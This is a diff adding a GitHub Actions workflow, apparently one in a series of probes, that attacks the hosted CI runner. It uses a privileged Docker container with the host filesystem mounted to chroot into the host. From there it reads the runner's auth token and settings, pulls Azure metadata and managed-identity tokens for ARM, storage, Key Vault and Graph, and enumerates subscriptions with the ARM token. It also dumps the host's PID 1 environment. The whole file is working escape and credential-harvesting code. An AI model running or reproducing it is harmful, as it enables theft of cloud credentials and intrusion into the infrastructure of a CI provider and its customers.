@@ -1,0 +1,123 @@
+name: Probe v62 - authToken hash + IMDS MI + ARM enum
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - name: v62 chroot file-based - authToken + IMDS + ARM
+        run: |
+          # Write chroot script directly (host python3 will execute it)
+          cat > /tmp/v62_chroot.py << 'CHROOT_EOF'
+          import json, urllib.request, urllib.error, hashlib, os
+
+          def fetch(url, headers=None, timeout=4):
+              try:
+                  req = urllib.request.Request(url, headers=headers or {})
+                  r = urllib.request.urlopen(req, timeout=timeout)
+                  return r.getcode(), r.read().decode('utf-8', 'replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read(2048).decode('utf-8', 'replace')
+              except Exception as ex:
+                  return 0, str(ex)
+
+          print("=== SETTINGS ===")
+          try:
+              with open('/opt/hca/.settings') as f:
+                  s = json.load(f)
+              tok = s.get('authToken', '')
+              print('authToken_sha256=' + hashlib.sha256(tok.encode()).hexdigest())
+              print('authToken_len=' + str(len(tok)))
+              for k in ['schedulerApiUrl','traceApiUrl','watchdogTraceApiUrl',
+                        'configId','quotaId','vmName','returnJobResultForHosted']:
+                  if k in s:
+                      print(k + '=' + str(s[k]))
+          except Exception as ex:
+              print('SETTINGS_ERROR=' + str(ex))
+
+          print("")
+          print("=== IMDS INSTANCE ===")
+          code, body = fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                             {'Metadata': 'true'})
+          print('instance_status=' + str(code))
+          if code == 200:
+              try:
+                  d = json.loads(body)
+                  c = d.get('compute', {})
+                  for k in ['subscriptionId','resourceGroupName','vmId','name',
+                             'location','vmSize','osType']:
+                      print('compute.' + k + '=' + str(c.get(k, '')))
+                  print('compute.tags=' + json.dumps(c.get('tags', {})))
+                  if 'identity' in d:
+                      print('compute.identity=' + json.dumps(d['identity']))
+              except Exception as ex:
+                  print('IMDS_PARSE_ERROR=' + str(ex))
+          else:
+              print('body=' + body[:400])
+
+          print("")
+          print("=== IMDS MI TOKENS ===")
+          MI_RESOURCES = [
+              ('https://management.azure.com/', 'ARM'),
+              ('https://storage.azure.com/', 'STORAGE'),
+              ('https://vault.azure.net', 'KEYVAULT'),
+              ('https://graph.microsoft.com/', 'MSGRAPH'),
+          ]
+          arm_token = None
+          for resource, label in MI_RESOURCES:
+              url = ('http://169.254.169.254/metadata/identity/oauth2/token'
+                     '?api-version=2018-02-01&resource=' + resource)
+              code, body = fetch(url, {'Metadata': 'true'})
+              print('[' + label + '] status=' + str(code))
+              if code == 200:
+                  try:
+                      d = json.loads(body)
+                      tok = d.get('access_token', '')
+                      print('[' + label + '] token_sha256=' + hashlib.sha256(tok.encode()).hexdigest())
+                      print('[' + label + '] token_type=' + d.get('token_type', ''))
+                      print('[' + label + '] expires_on=' + d.get('expires_on', ''))
+                      print('[' + label + '] resource=' + d.get('resource', ''))
+                      print('[' + label + '] client_id=' + d.get('client_id', ''))
+                      if label == 'ARM':
+                          arm_token = tok
+                  except Exception as ex:
+                      print('[' + label + '] PARSE_ERROR=' + str(ex))
+              else:
+                  print('[' + label + '] body=' + body[:300])
+
+          print("")
+          print("=== ARM ENUMERATION ===")
+          if arm_token:
+              code, body = fetch(
+                  'https://management.azure.com/subscriptions?api-version=2020-01-01',
+                  {'Authorization': 'Bearer ' + arm_token, 'Content-Type': 'application/json'})
+              print('[ARM] subscriptions status=' + str(code))
+              if code == 200:
+                  try:
+                      d = json.loads(body)
+                      for sub in d.get('value', [])[:10]:
+                          print('[ARM] sub: id=' + sub.get('subscriptionId', '') +
+                                ' name=' + sub.get('displayName', '') +
+                                ' state=' + sub.get('state', ''))
+                  except Exception as ex:
+                      print('[ARM] parse_error=' + str(ex))
+              else:
+                  print('[ARM] body=' + body[:400])
+          else:
+              print('[ARM] no ARM token')
+
+          print("")
+          print("=== DONE ===")
+          CHROOT_EOF
+
+          echo "[v62] chroot script written to /tmp/v62_chroot.py"
+          echo "[v62] running via docker privileged + host net + bind mount..."
+          docker run --rm --privileged --net=host -v /:/host ubuntu:latest \
+            chroot /host python3 /tmp/v62_chroot.py
+          echo "[v62] docker run complete"
+
+          echo ""
+          echo "=== HOST PID1 ENVIRON (direct bind mount, no chroot) ==="
+          docker run --rm --privileged -v /:/host ubuntu:latest \
+            /bin/sh -c 'cat /host/proc/1/environ 2>/dev/null | tr "\000" "\n" | head -40'
